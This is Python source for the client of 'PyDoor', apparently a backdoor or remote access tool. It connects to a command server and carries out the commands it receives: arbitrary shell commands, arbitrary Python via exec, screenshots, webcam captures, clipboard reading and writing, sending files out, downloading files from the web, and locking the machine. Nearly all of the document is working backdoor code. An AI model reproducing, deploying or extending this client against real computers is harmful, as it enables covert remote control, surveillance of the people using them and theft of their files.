""" PyDoor Client """
import json
import logging
import subprocess
from contextlib import redirect_stdout, suppress
from io import StringIO

from cryptography import x509
from modules import clipboard, download, screen, webcam, windows
from utils.baseclient import BaseClient

logging.basicConfig(level=logging.DEBUG)

BLOCK_SIZE = 32768

class Client(BaseClient):
    """ Client for managing commands """

    def __init__(self, certificate: x509.Certificate) -> None:
        BaseClient.__init__(self, certificate)

    def listen(self) -> None:
        """ Listen for coming commands """
        # Wait for a command to arrive
        command = self.read().decode()
        match command:
            case 'PING':
                self.ping()
            case 'SHELL':
                self.shell()
            case 'PYTHON':
                self.interpreter()
            case 'SCREENSHOT':
                self.screenshot()
            case 'WEBCAM':
                self.webcam()
            case 'COPY':
                self.copy()
            case 'PASTE':
                self.paste()
            case 'SEND_FILE':
                self.send_file()
            case 'RECEIVE_FILE':
                self.receive_file()
            case 'DOWNLOAD':
                self.download()
            case 'LOCK':
                self.lock()
            case _:
                logging.debug('Received unrecognized command: %s', command)

    def ping(self) -> None:
        """ Respond to server ping """
        self.write(b'PONG')

    def shell(self) -> None:
        """ Open a shell for peer """
        command = self.read().decode()
        logging.info('Executing shell command: %s', command)
        output = subprocess.run(command, shell=True, capture_output=True, check=False)
        self.write(output.stdout + output.stderr)

    def interpreter(self) -> None:
        """ Open python interpreter for peer """
        command = self.read().decode()
        logging.info('Executing python command: %s', command)
        error_message = ''

        with redirect_stdout(StringIO()) as output:
            try:
                exec(command)
            except Exception as error:
                error_message = f'{error.__class__.__name__}: {str(error)}\n'

        self.write((output.getvalue() + error_message).encode())

    def screenshot(self) -> None:
        """ Take a screenshot """
        logging.debug('Capturing screenshot')
        try:
            data = screen.screenshot()
        except RuntimeError as error:
            error_message = f'{error.__class__.__name__}: {str(error)}'
            logging.error('Error taking screenshot: %s', error_message)
            data = ('ERROR: ' + error_message).encode()
        else:
            logging.info('Successfully captured screenshot')
        self.write(data)

    def webcam(self) -> None:
        """ Capture webcam """
        logging.debug('Capturing webcam')
        try:
            img_data = webcam.capture_webcam()
        except RuntimeError:
            logging.error('Could not capture webcam')
            img_data = b'ERROR'
        else:
            logging.info('Captured webcam')
        self.write(img_data)

    def copy(self) -> None:
        """ Copy to clipboard """
        logging.debug('Attempting to copy to clipboard')
        data = self.read().decode()
        try:
            clipboard.copy(data)
        except RuntimeError as error:
            logging.error('Error occurred copying to clipboard: %s', str(error))
            self.write(str(error).encode())
        else:
            logging.info('Copied "%s" to clipboard', data)
            self.write(b'SUCCESS')

    def paste(self) -> None:
        """ Paste from clipboard """
        logging.debug('Attempting to paste from clipboard')
        try:
            content = clipboard.paste()
        except RuntimeError as error:
            logging.error('Error occurred pasting from clipboard: %s', str(error))
            self.write(b'ERROR')
            self.write(str(error).encode())
        else:
            if content is None:
                content = ''
            logging.info('Pasted "%s" from clipboard', content)
            self.write(content.encode())

    def send_file(self) -> None:
        """ Send a file to server """
        logging.debug('Sending file to server')
        filename = self.read().decode()
        try:
            with open(filename, 'rb') as file:
                while True:
                    block = file.read(BLOCK_SIZE)
                    if not block:
                        break
                    self.write(block)

        except (FileNotFoundError, PermissionError) as error:
            logging.error('Error opening file %s: %s', filename, str(error))
            self.write(b'ERROR')
            self.write(f'{error.__class__.__name__}: {str(error)}'.encode())
        else:
            self.write(b'FILE_TRANSFER_DONE')
            logging.info('Successfully transferred file %s to server', str(filename))

    def receive_file(self) -> None:
        """ Receive file from server """
        logging.debug('Attempting to receive file from server')
        filename = self.read().decode()
        try:
            with open(filename, 'wb') as file:
                self.write(b'FILE_OPENED')
                while True:
                    block = self.read()
                    if block == b'FILE_TRANSFER_DONE':
                        break
                    file.write(block)

        except (PermissionError) as error:
            logging.error('Error receiving file from server: %s', str(error))
            self.write(f'{error.__class__.__name__}: {str(error)}')

    def download(self) -> None:
        """ Download a file from the web """
        logging.debug("Attempting to download file from the web")
        url, filename = json.loads(self.read().decode())

        try:
            download.download(url, filename)
        except TimeoutError:
            logging.error("Download of '%s' timed out", url)
            self.write(b"Download timed out.")
        except (RuntimeError, OSError) as error:
            logging.error("Error downloading file from the web: %s", str(error))
            self.write(str(error).encode())
        else:
            logging.info("Saved downloaded file from '%s' as '%s'", url, filename)
            self.write(b'Success')

    def lock(self) -> None:
        """ Lock Machine (Windows only) """
        logging.debug("Attempting to lock machine")

        try:
            windows.lock()
        except AttributeError as error:
            logging.error("Could not lock machine: %s", str(error))
            self.write(b"Locking is only supported on Windows.")
        except OSError as error:
            logging.error("Could not lock machine: %s", str(error))
            self.write(str(error).encode())
        else:
            logging.info("Locked machine")
            self.write(b'LOCKED')


if __name__ == '__main__':

    # Read certificate from file
    with open('cert.pem', 'rb') as cert_file:
        cert = x509.load_pem_x509_certificate(cert_file.read())

    # Connect to server
    client = Client(cert)
    client.connect(('localhost', 6969))

    # Listen to commands indefinitely
    while True:
        with suppress(TimeoutError):
            client.listen()
